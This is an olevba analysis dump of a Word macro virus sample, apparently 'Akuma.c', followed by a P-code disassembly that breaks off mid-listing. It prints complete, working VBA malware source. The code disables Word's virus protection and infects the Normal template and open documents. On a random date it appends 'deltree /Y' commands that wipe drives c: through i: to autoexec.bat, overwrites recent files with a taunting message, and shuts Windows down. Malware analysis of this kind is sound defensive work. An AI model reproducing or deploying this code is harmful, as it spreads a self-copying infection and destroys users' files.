olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Akuma.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Akuma.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Stand
'1
    On Error Resume Next
    If Dir("c:\kill.log", vbArchive + vbHidden + vbReadOnly) = "" Then
        Open "c:\kill.log" For Output As #1
        Randomize
        Dataccia = DateAdd("d", Int((30 * Rnd) + 1), Date)
        Print #1, Dataccia
        Close #1
        SetAttr "c:\kill.log", vbArchive + vbHidden + vbReadOnly
    Else
        Open "c:\kill.log" For Input As #1
        Line Input #1, Dataccia
        If DateDiff("d", Date, Dataccia) <= 0 Then StandDestroy
        Close #1
    End If
End Sub

Private Sub Document_Open()
'Stand
'1
    Stand
End Sub

Private Sub Document_New()
'Stand
'1
    Stand
End Sub

Private Sub Stand()
'Stand
'1
'Copies: 257
    On Error Resume Next
    stato = ActiveDocument.Saved
    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    Application.DisplayRecentFiles = True
    RecentFiles.Maximum = 9
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    For c = 1 To 2
        db = StandClear(bry, "Sub Document_Close()")
        db = StandClear(bry, "Private Sub Document_Close()")
        db = StandClear(bry, "Sub Document_New()")
        db = StandClear(bry, "Private Sub Document_New()")
        db = StandClear(bry, "Sub Document_Open()")
        db = StandClear(bry, "Private Sub Document_Open()")
        db = StandClear(bry, "Sub AutoClose()")
        db = StandClear(bry, "Private Sub AutoClose()")
        db = StandClear(bry, "Sub AutoOpen()")
        db = StandClear(bry, "Private Sub AutoOpen()")
        db = StandClear(bry, "Sub AutoNew()")
        db = StandClear(bry, "Private Sub AutoNew()")
        db = StandClear(bry, "Private Sub Stand()")
        db = StandClear(bry, "Private Function StandClear(DoveM, StartM)")
        db = StandClear(bry, "Private Sub StandDestroy()")
        db = StandClear(bry, "Private Function StandFind(DoveM, StartM, Infect)")
        db = StandClear(bry, "Private Function StandInfect()")
        db = StandClear(bry, "Private Function StandWrite(StartM)")
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    Next c
    SetAttr "c:\Stand.log", vbNormal
    Kill "c:\Stand.log"
    Open "c:\Stand.log" For Output As #1
    db = StandWrite("Private Sub Document_Close()")
    db = StandWrite("Private Sub Document_Open()")
    db = StandWrite("Private Sub Document_New()")
    db = StandWrite("Private Sub Stand()")
    db = StandWrite("Private Function StandClear(DoveM, StartM)")
    db = StandWrite("Private Sub StandDestroy()")
    db = StandWrite("Private Function StandFind(DoveM, StartM, Infect)")
    db = StandWrite("Private Function StandInfect()")
    db = StandWrite("Private Function StandWrite(StartM)")
    Close #1
    SetAttr "c:\Stand.log", vbNormal
    StandInfect
    Kill "c:\Stand.log"
    Randomize
    If Int((10 * Rnd) + 1) = 6 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Stand Macro Carrier"
            .Author = "Lonely Mad"
            .Keywords = "I'll destroy you"
            .Execute
        End With
    End If
    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
    ActiveDocument.Saved = stato
    On Error GoTo 0
End Sub

Private Function StandClear(DoveM, StartM)
'Stand
'1
    Count = StandFind(DoveM, StartM, True)
    If Left(Count, 5) <> "Stand" Then
        Do Until DoveM.CodeModule.Lines(Count, 1) = "End Sub" Or DoveM.CodeModule.Lines(Count, 1) = "End Function"
            DoveM.CodeModule.DeleteLines (Count)
        Loop
        DoveM.CodeModule.DeleteLines (Count)
    End If
End Function

Private Sub StandDestroy()
'Stand
'1
    On Error Resume Next
    SetAttr "c:\kill.log", vbNormal
    Kill "c:\kill.log"
    Randomize
    WhickStand = Int(5 * Rnd) + 1
    Select Case WhickStand
        Case 1
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "The World")
            SetAttr "c:\autoexec.bat", vbNormal
            Open "c:\autoexec.bat" For Input As #1
                Do Until EOF(1)
                    Input #1, stress
                Loop
            Close #1
            If stress <> "next time I'll KILL YOU" Then
                Open "c:\autoexec.bat" For Append As #1
                    Print #1, "deltree /Y i:\*"
                    Print #1, "deltree /Y h:\*"
                    Print #1, "deltree /Y g:\*"
                    Print #1, "deltree /Y f:\*"
                    Print #1, "deltree /Y e:\*"
                    Print #1, "deltree /Y d:\*"
                    Print #1, "deltree /Y c:\*"
                    Print #1, "rem Created by The Lonely Mad"
                    Print #1, "rem Hey, looser, now your system, next time I'll KILL YOU"
                Close #1
            End If
            Tasks.ExitWindows
        Case 2
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Killer Queen")
            If Dir("c:\Abdul.log", vbArchive + vbHidden + vbReadOnly) = "" Then
                For c = 1 To Application.RecentFiles.Count
                    If Left(Application.RecentFiles.Item(c).Path, 3) <> "A:\" Then
                        Open Application.RecentFiles.Item(c).Path + "\" + Application.RecentFiles.Item(c) For Output As #1
                        Print #1, "Killer Queen kills stupid people like you, " + Application.UserName + "."
                        Close #1
                    End If
                Next c
            Else
                MsgBox "Killer Queen kills stupid people like you, " + Application.UserName + "."
            End If
            Tasks.ExitWindows
        Case 3
            var = MsgBox("This application caused a general protection error:" + Chr$(10) + "The system will be restarted", vbCritical, "Vanilla Ice")
            Tasks.ExitWindows
        Case 4
            var = MsgBox("This application caused a general protection error", vbCritical, "Star Platinum")
        Case 5
            var = MsgBox("This application caused a general protection error", vbCritical, "Crazy Diamond")
    End Select
    On Error GoTo 0
End Sub

Private Function StandFind(DoveM, StartM, Infect)
'Stand
'1
    For Count = 1 To DoveM.CodeModule.CountOfLines
        If LCase$(DoveM.CodeModule.Lines(Count, 1)) = LCase$(StartM) Then
            If Infect = False Then
                If StartM = "Private Sub Stand()" Then
                    var = Val(Trim(Right(DoveM.CodeModule.Lines(Count + 3, 1), Len(DoveM.CodeModule.Lines(Count + 3, 1)) - 8)))
                    DoveM.CodeModule.DeleteLines (Count + 3)
                    DoveM.CodeModule.InsertLines (Count + 3), "'Copies:" + Str(var + 1)
                End If
            End If
            If Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) >= 1 Then
                StandFind = "Stand Yes" + Str(Count)
                Exit Function
            ElseIf Trim(DoveM.CodeModule.Lines(Count + 1, 1)) = "'Stand" And Val(Trim(Right(DoveM.CodeModule.Lines(Count + 2, 1), Len(DoveM.CodeModule.Lines(Count + 2, 1)) - 1))) < 1 Then
                GoTo FindIt
            Else
FindIt:         For cnt = 1 To DoveM.CodeModule.CountOfLines
                    If LCase$(DoveM.CodeModule.Lines(cnt, 1)) = LCase$(StartM) Then Exit For
                Next cnt
                StandFind = cnt
                Exit Function
            End If
        End If
    Next Count
    StandFind = "Stand"
End Function

Private Function StandInfect()
'Stand
'1
    If StandFind(NormalTemplate.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
        flag = True
    ElseIf StandFind(ActiveDocument.VBProject.VBComponents.Item(1), "Private Sub Stand()", True) = "Stand" Then
        Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
        flag = True
    Else
        flag = False
    End If
    If flag = True Then
        Open "c:\Stand.log" For Input As #2
        If LOF(2) = 0 Then GoTo cpyvir
        Count = 1
        Do While Not EOF(2)
            Line Input #2, stress
            bry.CodeModule.InsertLines Count, stress
            Count = Count + 1
        Loop
cpyvir: Close #2
    End If
End Function

Private Function StandWrite(StartM)
'Stand
'1
    Count = StandFind(MacroContainer.VBProject.VBComponents.Item(1), StartM, False)
    If Count <> "Stand" Then
        If Left(Count, Len("Stand Yes")) = "Stand Yes" Then
            Count = Val(Right(Count, Len(Count) - Len("Stand Yes")))
        End If
        Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Sub" Or MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1) = "End Function"
            stress = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
            Print #1, stress
            Count = Count + 1
        Loop
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(Count, 1)
        Print #1, ""
    End If
End Function

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Akuma.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 21523 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #2:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitStr 0x000B "c:\kill.log"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #5:
' 	LitStr 0x000B "c:\kill.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #6:
' 	ArgsCall Read 0x0000 
' Line #7:
' 	LitStr 0x0001 "d"
' 	LitDI2 0x001E 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	Ld Date 
' 	ArgsLd DateAdd 0x0003 
' 	St Dataccia 
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Dataccia 
' 	PrintItemNL 
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #10:
' 	LitStr 0x000B "c:\kill.log"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	LitStr 0x000B "c:\kill.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #13:
' 	LitDI2 0x0001 
' 	Ld Dataccia 
' 	LineInput 
' Line #14:
' 	LitStr 0x0001 "d"
' 	Ld Date 
' 	Ld Dataccia 
' 	ArgsLd DateDiff 0x0003 
' 	LitDI2 0x0000 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	ArgsCall StandDestroy 0x0000 
' 	EndIf 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Private Sub Document_Open())
' Line #20:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #21:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #22:
' 	ArgsCall Stand 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' Line #25:
' 	FuncDefn (Private Sub Document_New())
' Line #26:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #27:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #28:
' 	ArgsCall Stand 0x0000 
' Line #29:
' 	EndSub 
' Line #30:
' Line #31:
' 	FuncDefn (Private Sub Stand())
' Line #32:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #33:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #34:
' 	QuoteRem 0x0000 0x000B "Copies: 257"
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St stato 
' Line #37:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #38:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #41:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #42:
' 	EndWith 
' Line #43:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #44:
' 	LitDI2 0x0009 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #46:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	For 
' Line #47:
' 	Ld bry 
' 	LitStr 0x0014 "Sub Document_Close()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #48:
' 	Ld bry 
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #49:
' 	Ld bry 
' 	LitStr 0x0012 "Sub Document_New()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #50:
' 	Ld bry 
' 	LitStr 0x001A "Private Sub Document_New()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #51:
' 	Ld bry 
' 	LitStr 0x0013 "Sub Document_Open()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #52:
' 	Ld bry 
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #53:
' 	Ld bry 
' 	LitStr 0x000F "Sub AutoClose()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #54:
' 	Ld bry 
' 	LitStr 0x0017 "Private Sub AutoClose()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #55:
' 	Ld bry 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #56:
' 	Ld bry 
' 	LitStr 0x0016 "Private Sub AutoOpen()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #57:
' 	Ld bry 
' 	LitStr 0x000D "Sub AutoNew()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #58:
' 	Ld bry 
' 	LitStr 0x0015 "Private Sub AutoNew()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #59:
' 	Ld bry 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #60:
' 	Ld bry 
' 	LitStr 0x002A "Private Function StandClear(DoveM, StartM)"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #61:
' 	Ld bry 
' 	LitStr 0x001A "Private Sub StandDestroy()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #62:
' 	Ld bry 
' 	LitStr 0x0031 "Private Function StandFind(DoveM, StartM, Infect)"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #63:
' 	Ld bry 
' 	LitStr 0x001E "Private Function StandInfect()"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #64:
' 	Ld bry 
' 	LitStr 0x0023 "Private Function StandWrite(StartM)"
' 	ArgsLd StandClear 0x0002 
' 	St db 
' Line #65:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set bry 
' Line #66:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	LitStr 0x000C "c:\Stand.log"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #68:
' 	LitStr 0x000C "c:\Stand.log"
' 	ArgsCall Kill 0x0001 
' Line #69:
' 	LitStr 0x000C "c:\Stand.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #70:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #71:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #72:
' 	LitStr 0x001A "Private Sub Document_New()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #73:
' 	LitStr 0x0013 "Private Sub Stand()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #74:
' 	LitStr 0x002A "Private Function StandClear(DoveM, StartM)"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #75:
' 	LitStr 0x001A "Private Sub StandDestroy()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #76:
' 	LitStr 0x0031 "Private Function StandFind(DoveM, StartM, Infect)"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #77:
' 	LitStr 0x001E "Private Function StandInfect()"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #78:
' 	LitStr 0x0023 "Private Function StandWrite(StartM)"
' 	ArgsLd StandWrite 0x0001 
' 	St db 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #80:
' 	LitStr 0x000C "c:\Stand.log"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #81:
' 	ArgsCall StandInfect 0x0000 
' Line #82:
' 	LitStr 0x000C "c:\Stand.log"
' 	ArgsCall Kill 0x0001 
' Line #83:
' 	ArgsCall Read 0x0000 
' Line #84:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #85:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #86:
' 	LitStr 0x0013 "Stand Macro Carrier"
' 	MemStWith Title 
' Line #87:
' 	LitStr 0x000A "Lonely Mad"
' 	MemStWith Author 
' Line #88:
' 	LitStr 0x0010 "I'll destroy you"
' 	MemStWith Keywords 
' Line #89:
' 	ArgsMemCallWith Execute 0x0000 
' Line #90:
' 	EndWith 
' Line #91:
' 	EndIfBlock 
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #93:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	Ld stato 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #96:
' 	OnError (GoTo 0) 
' Line #97:
' 	EndSub 
' Line #98:
' Line #99:
' 	FuncDefn (Private Function StandClear(DoveM, StartM, id_FFFE As Variant))
' Line #100:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #101:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #102:
' 	Ld DoveM 
' 	Ld StartM 
' 	LitVarSpecial (True)
' 	ArgsLd StandFind 0x0003 
' 	St Count 
' Line #103:
' 	Ld Count 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Stand"
' 	Ne 
' 	IfBlock 
' Line #104:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000C "End Function"
' 	Eq 
' 	Or 
' 	DoUnitil 
' Line #105:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #106:
' 	Loop 
' Line #107:
' 	Ld Count 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	EndFunc 
' Line #110:
' Line #111:
' 	FuncDefn (Private Sub StandDestroy())
' Line #112:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #113:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	LitStr 0x000B "c:\kill.log"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #116:
' 	LitStr 0x000B "c:\kill.log"
' 	ArgsCall Kill 0x0001 
' Line #117:
' 	ArgsCall Read 0x0000 
' Line #118:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St WhickStand 
' Line #119:
' 	Ld WhickStand 
' 	SelectCase 
' Line #120:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #121:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x0009 "The World"
' 	ArgsLd MsgBox 0x0003 
' 	St var 
' Line #122:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #123:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #124:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	DoUnitil 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld stress 
' 	InputItem 
' 	InputDone 
' Line #126:
' 	Loop 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #128:
' 	Ld stress 
' 	LitStr 0x0017 "next time I'll KILL YOU"
' 	Ne 
' 	IfBlock 
' Line #129:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y i:\*"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y h:\*"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y g:\*"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y f:\*"
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y e:\*"
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y d:\*"
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "deltree /Y c:\*"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "rem Created by The Lonely Mad"
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "rem Hey, looser, now your system, next time I'll KILL YOU"
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #142:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #143:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x000C "Killer Queen"
' 	ArgsLd MsgBox 0x0003 
' 	St var 
' Line #144:
' 	LitStr 0x000C "c:\Abdul.log"
' 	Ld vbArchive 
' 	Ld vbHidden 
' 	Add 
' 	Ld vbReadOnly 
' 	Add 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #145:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Count 
' 	For 
' Line #146:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "A:\"
' 	Ne 
' 	IfBlock 
' Line #147:
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Path 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld c 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	ArgsMemLd Item 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "Killer Queen kills stupid people like you, "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	ElseBlock 
' Line #153:
' 	LitStr 0x002B "Killer Queen kills stupid people like you, "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	ArgsCall MsgBox 0x0001 
' Line #154:
' 	EndIfBlock 
' Line #155:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #156:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #157:
' 	LitStr 0x0033 "This application caused a general protection error:"
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x001C "The system will be restarted"
' 	Add 
' 	Ld vbCritical 
' 	LitStr 0x000B "Vanilla Ice"
' 	ArgsLd MsgBox 0x0003 
' 	St var 
' Line #158:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #159:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #160:
' 	LitStr 0x0032 "This application caused a general protection error"
' 	Ld vbCritical 
' 	LitStr 0x000D "Star Platinum"
' 	ArgsLd MsgBox 0x0003 
' 	St var 
' Line #161:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #162:
' 	LitStr 0x0032 "This application caused a general protection error"
' 	Ld vbCritical 
' 	LitStr 0x000D "Crazy Diamond"
' 	ArgsLd MsgBox 0x0003 
' 	St var 
' Line #163:
' 	EndSelect 
' Line #164:
' 	OnError (GoTo 0) 
' Line #165:
' 	EndSub 
' Line #166:
' Line #167:
' 	FuncDefn (Private Function StandFind(DoveM, StartM, Infect, id_FFFE As Variant))
' Line #168:
' 	QuoteRem 0x0000 0x0005 "Stand"
' Line #169:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #170:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #171:
' 	Ld Count 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd LCase$ 0x0001 
' 	Ld StartM 
' 	ArgsLd LCase$ 0x0001 
' 	Eq 
' 	IfBlock 
' Line #172:
' 	Ld Infect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #173:
' 	Ld StartM 
' 	LitStr 0x0013 "Private Sub Stand()"
' 	Eq 
' 	IfBlock 
' Line #174:
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	FnLen 
' 	LitDI2 0x0008 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	St var 
' Line #175:
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	Paren 
' 	Ld DoveM 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #176:
' 	Ld Count 
' 	LitDI2 0x0003 
' 	Add 
' 	Paren 
' 	LitStr 0x0008 "'Copies:"
' 	Ld var 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld DoveM 
' 	MemLd CodeModule 
